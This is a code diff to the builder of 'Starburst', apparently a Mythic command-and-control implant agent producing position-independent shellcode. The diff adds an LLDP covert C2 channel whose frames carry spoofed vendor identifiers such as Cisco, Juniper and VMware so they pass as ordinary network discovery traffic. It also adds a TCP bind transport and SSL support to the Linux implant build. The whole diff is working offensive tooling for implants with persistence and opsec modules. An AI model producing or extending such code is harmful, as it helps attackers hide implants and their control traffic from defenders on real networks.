@@ -94,7 +94,7 @@ class Starburst(PayloadType):
     wrapped_payloads = ["erebus_wrapper", "service_wrapper", "scarecrow_wrapper"]
     note = "PIC shellcode agent based on Stardust framework and Crystal Palace."
     supports_dynamic_loading = True
-    c2_profiles = ["http", "httpx", "github", "smb", "tcp", "ssh"]
+    c2_profiles = ["http", "httpx", "github", "smb", "tcp", "ssh", "lldp"]
     mythic_encrypts = True
     translation_container = "StarburstTranslator"
 
@@ -347,6 +347,8 @@ class Starburst(PayloadType):
                 transport_define = "#define TCP_TRANSPORT"
             elif c2_profile_name == "ssh":
                 transport_define = "#define SSH_TRANSPORT"
+            elif c2_profile_name == "lldp":
+                transport_define = "#define LLDP_TRANSPORT"
 
             import logging
             logger = logging.getLogger("starburst.builder")
@@ -682,6 +684,29 @@ class Starburst(PayloadType):
 
             mode = 0 if c2_params.get("connection_mode", "persistent") == "persistent" else 1
             buf += struct.pack(">I", mode)
+
+        elif c2_profile == "lldp":
+            oui_presets = {
+                "Cisco (00000C)": "00000C",
+                "Aruba/HPE (000B86)": "000B86",
+                "Juniper (000585)": "000585",
+                "Arista (001C73)": "001C73",
+                "Dell (001422)": "001422",
+                "VMware (005056)": "005056",
+                "Ubiquiti (FCECDA)": "FCECDA",
+                "MikroTik (D4CA6D)": "D4CA6D",
+                "Samsung (001632)": "001632",
+                "IANA/IETF (00005E)": "00005E",
+            }
+            profile = c2_params.get("oui_profile", "Cisco (00000C)")
+            if profile == "Custom":
+                oui_hex = c2_params.get("oui_custom", "00000C")
+            else:
+                oui_hex = oui_presets.get(profile, "00000C")
+            oui_bytes = bytes.fromhex(oui_hex.ljust(6, "0")[:6])
+            buf += oui_bytes
+            subtype = int(c2_params.get("subtype", "01"), 16)
+            buf += struct.pack("B", subtype)
 
         return buf
 
@@ -1055,12 +1080,13 @@ class Starburst(PayloadType):
                 c2_params = c2.get_parameters_dict()
                 break
 
-            if c2_profile_name not in ("http", "httpx"):
+            if c2_profile_name not in ("http", "httpx", "lldp", "tcp"):
                 resp.status = BuildStatus.Error
-                resp.build_message = f"Linux agent only supports HTTP/HTTPX C2, got: {c2_profile_name}"
+                resp.build_message = f"Linux agent only supports HTTP/HTTPX/LLDP/TCP C2, got: {c2_profile_name}"
                 return resp
 
             host = c2_params.get("callback_host", "")
+            use_ssl = 1 if host.startswith("https://") else 0
             if "://" in host:
                 host = host.split("://", 1)[1]
             if host.endswith("/"):
@@ -1098,7 +1124,7 @@ class Starburst(PayloadType):
             linux_src_dir = os.path.join(str(self.agent_code_path), "src", "linux")
             linux_src_files = [
                 "main.c", "tlv.c", "crypto.c", "transport.c", "transport_tcp.c",
-                "commands.c", "proxy.c", "persist.c", "opsec.c", "jobs.c",
+                "transport_lldp.c", "commands.c", "proxy.c", "persist.c", "opsec.c", "jobs.c",
             ]
 
             for sf in linux_src_files:
@@ -1119,9 +1145,43 @@ class Starburst(PayloadType):
                 f'-DCFG_POST_URI="{post_uri}"',
                 f"-DCFG_SLEEP_INTERVAL={interval}",
                 f"-DCFG_SLEEP_JITTER={jitter}",
+                f"-DCFG_USE_SSL={use_ssl}",
             ]
             if debug:
                 defines.append("-DDEBUG_BUILD")
+
+            if c2_profile_name == "lldp":
+                defines.append("-DLLDP_TRANSPORT")
+                oui_presets = {
+                    "Cisco (00000C)": "00000C",
+                    "Aruba/HPE (000B86)": "000B86",
+                    "Juniper (000585)": "000585",
+                    "Arista (001C73)": "001C73",
+                    "Dell (001422)": "001422",
+                    "VMware (005056)": "005056",
+                    "Ubiquiti (FCECDA)": "FCECDA",
+                    "MikroTik (D4CA6D)": "D4CA6D",
+                    "Samsung (001632)": "001632",
+                    "IANA/IETF (00005E)": "00005E",
+                }
+                profile = c2_params.get("oui_profile", "Cisco (00000C)")
+                if profile == "Custom":
+                    oui_hex = c2_params.get("oui_custom", "00000C")
+                else:
+                    oui_hex = oui_presets.get(profile, "00000C")
+                oui_hex = oui_hex.ljust(6, "0")[:6]
+                defines.append(f"-DCFG_LLDP_OUI_0=0x{oui_hex[0:2]}")
+                defines.append(f"-DCFG_LLDP_OUI_1=0x{oui_hex[2:4]}")
+                defines.append(f"-DCFG_LLDP_OUI_2=0x{oui_hex[4:6]}")
+                subtype = int(c2_params.get("subtype", "01"), 16)
+                defines.append(f"-DCFG_LLDP_SUBTYPE=0x{subtype:02x}")
+                peer_ip = c2_params.get("peer_ip", "")
+                if peer_ip:
+                    defines.append(f'-DCFG_LLDP_PEER_IP="{peer_ip}"')
+            elif c2_profile_name == "tcp":
+                defines.append("-DTCP_TRANSPORT")
+                tcp_port = int(c2_params.get("port", None) or 7000)
+                defines.append(f"-DCFG_TCP_BIND_PORT={tcp_port}")
 
             out_path = os.path.join(build_dir, "starburst_linux")
 
